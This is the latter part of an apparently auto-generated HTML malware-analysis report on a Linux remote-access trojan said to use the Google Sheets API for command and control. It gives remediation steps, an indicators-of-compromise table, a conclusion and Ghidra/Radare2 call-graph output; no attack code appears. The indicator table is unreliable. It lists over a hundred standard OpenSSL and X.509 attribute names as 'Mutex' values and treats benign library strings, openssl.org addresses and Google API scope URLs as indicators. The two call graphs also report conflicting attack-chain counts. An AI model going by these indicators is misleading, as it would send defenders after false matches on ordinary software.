+            <div class="space-y-4"><div class="flex gap-4 items-start pb-4 border-b border-dashed border-gray-200 last:border-0"><div class="flex-shrink-0" style="width:24px;height:24px;border-radius:50%;background:#1f2937;color:white;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;">1</div><div class="text-sm pt-half text-gray-800">Revoke Credentials: Immediately revoke the Google Service Account credentials embedded in the binary (Client Email and Private Key) found in the decrypted configuration.</div></div><div class="flex gap-4 items-start pb-4 border-b border-dashed border-gray-200 last:border-0"><div class="flex-shrink-0" style="width:24px;height:24px;border-radius:50%;background:#1f2937;color:white;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;">2</div><div class="text-sm pt-half text-gray-800">Audit Access Logs: Review Google Workspace Audit Logs for the specific Service Account to identify any accessed spreadsheets, exfiltrated data, or executed commands.</div></div><div class="flex gap-4 items-start pb-4 border-b border-dashed border-gray-200 last:border-0"><div class="flex-shrink-0" style="width:24px;height:24px;border-radius:50%;background:#1f2937;color:white;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;">3</div><div class="text-sm pt-half text-gray-800">Isolate Infected Hosts: Identify and isolate systems that have executed this binary. Check for the presence of the file indicated by the SHA256 hash.</div></div><div class="flex gap-4 items-start pb-4 border-b border-dashed border-gray-200 last:border-0"><div class="flex-shrink-0" style="width:24px;height:24px;border-radius:50%;background:#1f2937;color:white;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;">4</div><div class="text-sm pt-half text-gray-800">Scan for Artifacts: Search file systems for the specific configuration file or the binary itself using the provided IOCs.</div></div><div class="flex gap-4 items-start pb-4 border-b border-dashed border-gray-200 last:border-0"><div class="flex-shrink-0" style="width:24px;height:24px;border-radius:50%;background:#1f2937;color:white;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:bold;">5</div><div class="text-sm pt-half text-gray-800">Network Monitoring: Implement network rules to alert on traffic to <code>sheets.googleapis.com</code> and <code>oauth2.googleapis.com</code> originating from non-standard user-agents or unusual endpoints, though blocking these domains entirely is often impractical.</div></div></div>
+        </div>
+
+        <!-- IOCs -->
+        <div>
+            <h2 class="section-header">10. Indicators of Compromise (IOCs)</h2>
+            <div class="markdown-content">
+                <table class="w-full text-left">
+                    <thead><tr><th width="20%">Type</th><th>Value</th></tr></thead>
+                    <tbody><tr><td class="font-bold text-xs text-gray-500 uppercase">Domain</td><td class="font-mono text-sm break-all">openssl.org</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Domain</td><td class="font-mono text-sm break-all">oauth2.googleapis.com</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Domain</td><td class="font-mono text-sm break-all">sheets.googleapis.com</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Domain</td><td class="font-mono text-sm break-all">www.googleapis.com</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Domain</td><td class="font-mono text-sm break-all">www.openssl.org</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://oauth2.googleapis.com/token</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://www.googleapis.com/auth/spreadsheets.readonly</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://www.googleapis.com/auth/spreadsheets</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://www.googleapis.com/auth/drive.file</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://www.googleapis.com/auth/drive.readonly</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">https://www.googleapis.com/auth/drive</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">URL</td><td class="font-mono text-sm break-all">http://www.openssl.org/support/faq.html</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/proc/self/exe</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/usr/local/ssl/lib/engines</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/var/run/egd-pool</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/dev/egd-pool</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/etc/egd-pool</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/etc/entropy</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/dev/urandom</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/dev/random</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/dev/srandom</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/usr/local/ssl/private</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/usr/local/ssl</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/usr/local/ssl/certs</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/usr/local/ssl/cert.pem</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">File Path</td><td class="font-mono text-sm break-all">/dev/tty</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Email</td><td class="font-mono text-sm break-all">appro@openssl.org</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">stateOrProvinceName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">organizationName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">organizationalUnitName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">unstructuredName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">challengePassword</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">unstructuredAddress</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">extendedCertificateAttributes</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">nsCaRevocationUrl</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">privateKeyUsagePeriod</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">basicConstraints</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">certificatePolicies</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">authorityKeyIdentifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">crlDistributionPoints</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">ripemd160WithRSA</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">extendedKeyUsage</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">authorityInfoAccess</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">basicOCSPResponse</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">acceptableResponses</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">subjectInfoAccess</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">policyConstraints</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">targetInformation</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">holdInstructionCode</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">holdInstructionNone</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">holdInstructionCallIssuer</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">holdInstructionReject</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pilotAttributeType</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pilotAttributeSyntax</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pilotObjectClass</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">caseIgnoreIA5StringSyntax</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">domainRelatedObject</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">simpleSecurityObject</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pilotOrganization</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">documentIdentifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">documentLocation</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">homeTelephoneNumber</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">lastModifiedTime</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pilotAttributeType27</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">associatedDomain</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">homePostalAddress</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">mobileTelephoneNumber</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pagerTelephoneNumber</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">friendlyCountryName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">organizationalStatus</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">mailPreferenceOption</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">singleLevelQuality</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">subtreeMinimumQuality</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">subtreeMaximumQuality</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">documentPublisher</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">x500UniqueIdentifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">generationQualifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">msSmartcardLogin</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">inhibitAnyPolicy</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">subjectDirectoryAttributes</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">issuingDistributionPoint</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">certificateIssuer</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">businessCategory</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">physicalDeliveryOfficeName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">facsimileTelephoneNumber</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">internationaliSDNNumber</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">registeredAddress</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">preferredDeliveryMethod</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">presentationAddress</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">authorityRevocationList</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">certificateRevocationList</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">crossCertificatePair</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">enhancedSearchGuide</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">protocolInformation</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">distinguishedName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">supportedAlgorithms</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">deltaRevocationList</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">anyExtendedKeyUsage</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">jurisdictionLocalityName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">jurisdictionCountryName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">jurisdictionStateOrProvinceName</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">affiliationChanged</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">cessationOfOperation</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">privilegeWithdrawn</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">policyIdentifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">CRLDistributionPoints</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">issuerDomainPolicy</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">subjectDomainPolicy</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">requireExplicitPolicy</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">inhibitPolicyMapping</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">permittedSubtrees</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">excludedSubtrees</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">pcPathLengthConstraint</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">revocationReason</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">singleExtensions</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">responseExtensions</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">otherRevInfoFormat</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">digestAlgorithms</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">encapContentInfo</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">encryptedContent</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">recipientEncryptedKeys</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">encryptedContentInfo</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">unprotectedAttrs</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">signedContentIdentifier</td></tr><tr><td class="font-bold text-xs text-gray-500 uppercase">Mutex</td><td class="font-mono text-sm break-all">originatorSignatureValue</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Conclusion -->
+        <div>
+            <h2 class="section-header">11. Conclusion</h2>
+            <div class="markdown-content" style="background-color: #f9fafb; border: 1px solid #e5e7eb; padding: 16px; border-radius: 4px;">
+                <p class="mb-3">The binary <code>fd043489720558128f03b9b42e4a85eb1b6b9ea61023bd64ada94b2b20de198c</code> is a fully functional Linux RAT that leverages the Google Sheets API as a command and control channel. It utilizes sophisticated techniques like self-decrypting configuration using the file itself as a key, OAuth2/JWT authentication, and standard HTTPS traffic to evade detection. Its capabilities include remote code execution, file exfiltration, and detailed system reconnaissance.</p>
+
+<strong>Verdict: Malware</strong>
+            </div>
+        </div>
+
+        <!-- Call Graph -->
+        <div>
+            <h2 class="section-header">12. Call Graph &amp; Attack Chains</h2>
+            <div class="markdown-content"><h3>Ghidra Call Graph</h3>
+<p class="mb-3"><strong>Nodes:</strong> 3971 | <strong>Edges:</strong> 10188 | <strong>Entries:</strong> _DT_FINI, _DT_INIT, entry | <strong>Attack Chains:</strong> 0</p>
+<p class="text-gray-500 italic">No sink-reaching attack chains were detected.</p>
+<h4>Adjacency — Top 10 of 300 Functions</h4>
+<table class="w-full text-left border-collapse">
+<tr><th>Function</th><th>Calls</th></tr>
+<tr><td><code>ACCESS_DESCRIPTION_free</code></td><td>FUN_0046d940</td></tr>
+<tr><td><code>AES_cbc_encrypt</code></td><td>FUN_00446500, FUN_004466f0, FUN_00446a20, FUN_00446c00</td></tr>
+<tr><td><code>AES_decrypt</code></td><td>FUN_00446c00</td></tr>
+<tr><td><code>AES_encrypt</code></td><td>FUN_004466f0</td></tr>
+<tr><td><code>ASN1_OBJECT_free</code></td><td>FUN_0043ab10</td></tr>
+<tr><td><code>ASN1_STRING_free</code></td><td>FUN_0043ab10</td></tr>
+<tr><td><code>ASN1_TYPE_free</code></td><td>FUN_0046d940</td></tr>
+<tr><td><code>BN_add</code></td><td>FUN_00449590, FUN_004adc50, FUN_004ade60</td></tr>
+<tr><td><code>BN_pseudo_rand</code></td><td>FUN_004b3ca0</td></tr>
+<tr><td><code>BN_rand</code></td><td>FUN_004b3ca0</td></tr>
+</table>
+<h3>Radare2 Call Graph</h3>
+<p class="mb-3"><strong>Nodes:</strong> 1856 | <strong>Edges:</strong> 6162 | <strong>Entries:</strong> entry0, fcn.00406880, main | <strong>Attack Chains:</strong> 30</p>
+<h4>Attack Chains</h4>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; sym.imp.fclose</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; sym.imp.fopen</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; sym.imp.fread</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; sym.imp.fwrite</li>
+<li class="mb-2"><strong>[Timing]</strong> main &rarr; sym.imp.sleep</li>
+<li class="mb-2"><strong>[Crypto]</strong> main &rarr; fcn.00408190 &rarr; sym.AES_cbc_encrypt</li>
+<li class="mb-2"><strong>[Execution]</strong> main &rarr; fcn.00407310 &rarr; sym.imp.pclose</li>
+<li class="mb-2"><strong>[Execution]</strong> main &rarr; fcn.00407310 &rarr; sym.imp.popen</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; fcn.00408190 &rarr; sym.imp.fclose</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; fcn.00408190 &rarr; sym.imp.fopen</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; fcn.00408190 &rarr; sym.imp.fread</li>
+<li class="mb-2"><strong>[File I/O]</strong> main &rarr; fcn.00408190 &rarr; sym.imp.readlink</li>
+<li class="mb-2"><strong>[Network]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getnameinfo</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getcwd</li>
+<li class="mb-2"><strong>[Recon]</strong> fcn.00406880 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.gethostname</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getifaddrs</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getpwuid</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.getuid</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408b20 &rarr; sym.imp.uname</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00408960 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.004093b0 &rarr; fcn.00409020 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.004094b0 &rarr; fcn.00409020 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00409240 &rarr; fcn.00409110 &rarr; fcn.00409020 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00409300 &rarr; fcn.00409110 &rarr; fcn.00409020 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.004093b0 &rarr; fcn.00409020 &rarr; fcn.00408960 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.004094b0 &rarr; fcn.00409020 &rarr; fcn.00408960 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00409240 &rarr; fcn.00409110 &rarr; fcn.00409020 &rarr; fcn.00408960 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+<li class="mb-2"><strong>[Recon]</strong> main &rarr; fcn.00409300 &rarr; fcn.00409110 &rarr; fcn.00409020 &rarr; fcn.00408960 &rarr; fcn.00407940 &rarr; fcn.004610f0 &rarr; fcn.0043a460 &rarr; sym.imp.getenv</li>
+</ul>
+<h4>Adjacency — Top 10 of 300 Functions</h4>
+<table class="w-full text-left border-collapse">
+<tr><th>Function</th><th>Calls</th></tr>
+<tr><td><code>entry0</code></td><td>sym.imp.__libc_start_main</td></tr>
+<tr><td><code>fcn.00406880</code></td><td>fcn.00406f2c, fcn.00406fb0, fcn.0043a460, fcn.004f46e0</td></tr>
+<tr><td><code>fcn.00406f2c</code></td><td>-</td></tr>
+<tr><td><code>fcn.00406fb0</code></td><td>-</td></tr>
+<tr><td><code>fcn.00406fe0</code></td><td>sym.imp.malloc, sym.imp.strlen</td></tr>
+<tr><td><code>fcn.00407120</code></td><td>sym.imp.malloc, sym.imp.realloc, sym.imp.strcat, sym.imp.strlen</td></tr>
+<tr><td><code>fcn.00407310</code></td><td>sym.imp.fgets, sym.imp.free, sym.imp.malloc, sym.imp.memset, sym.imp.pclose, sym.imp.popen, sym.imp.realloc, sym.imp.strcpy, sym.imp.strlen</td></tr>
+<tr><td><code>fcn.00407480</code></td><td>sym.imp.malloc, sym.imp.strncpy, sym.imp.strstr</td></tr>
+<tr><td><code>fcn.00407500</code></td><td>sym.imp.free, sym.imp.malloc, sym.imp.memset, sym.imp.realloc, sym.imp.strchr, sym.imp.strlen, sym.imp.strncpy, sym.imp.strrchr, sym.imp.strstr, sym.imp.strtok</td></tr>
+<tr><td><code>fcn.004077a0</code></td><td>fcn.004f0cdf, fcn.004f0df4, fcn.004f146f, sym.imp.calloc, sym.imp.free, sym.imp.memcpy</td></tr>
+</table>
+<h4>Detected Cycles — Top 5 of 5</h4>
+<ul class="list-disc pl-6 mb-4">
+<li class="mb-2"><code>fcn.00439f70 -&gt; fcn.00439f70</code></li>
+<li class="mb-2"><code>fcn.0046ed90 -&gt; fcn.0046ed90</code></li>
+<li class="mb-2"><code>fcn.00439f70 -&gt; fcn.0043a110 -&gt; fcn.00439f70</code></li>
+<li class="mb-2"><code>fcn.0046d8a0 -&gt; fcn.0046d5f0 -&gt; fcn.0046d8a0</code></li>
+<li class="mb-2"><code>fcn.0046f6c0 -&gt; fcn.00470590 -&gt; fcn.00470210 -&gt; fcn.0046f6c0</code></li>
+</ul></div>
+        </div>
+    
+
+        <!-- Footer -->
+        <div style="margin-top: 48px; padding-top: 24px; border-top: 1px solid #d1d5db; display: flex; justify-content: space-between; font-size: 12px; color: #9ca3af;" class="no-print">
+            <div>Confidential & Proprietary - Do Not Distribute Without Authorization</div>
+            <div>Generated by Ghidra + Radare2 Analysis Agent</div>
+        </div>
+    </div>
+</body>
+</html>
